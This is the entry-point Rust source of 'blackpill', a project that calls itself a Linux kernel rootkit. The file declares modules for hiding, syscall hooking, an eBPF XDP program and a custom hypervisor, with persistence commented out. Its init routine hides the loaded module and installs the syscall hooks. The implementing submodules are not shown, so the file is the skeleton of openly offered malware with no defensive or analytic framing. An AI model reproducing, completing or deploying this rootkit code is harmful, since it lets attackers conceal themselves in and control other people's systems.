//! A Linux kernel rootkit in Rust using a custom made type-2 hypervisor and eBPF XDP program.

pub(crate) mod hiding;
pub(crate) mod hooking;
pub(crate) mod hypervisor;
// pub(crate) mod persistence;
#[macro_use]
pub(crate) mod utils;
pub(crate) mod xdp;

pub(crate) use kernel::prelude::*;

module! {
    type: Blackpill,
    name: "blackpill",
    author: "Unknown",
    description: "Do we really need to add a description ?",
    license: "GPL",
}

struct Blackpill;

impl kernel::Module for Blackpill {
    fn init(module: &'static ThisModule) -> Result<Self> {
        // Hide rootkit
        hiding::hide(module);

        // Hook syscalls
        hooking::syscall::hook_syscalls();

        // Make it persistent
        // persistence::persist();

        // Initialize the XDP program
        xdp::init();

        // Initialize the hypervisor
        hypervisor::init();

        Ok(Blackpill)
    }
}

impl Drop for Blackpill {
    fn drop(&mut self) {
        pr_info!("Exiting\n");
    }
}
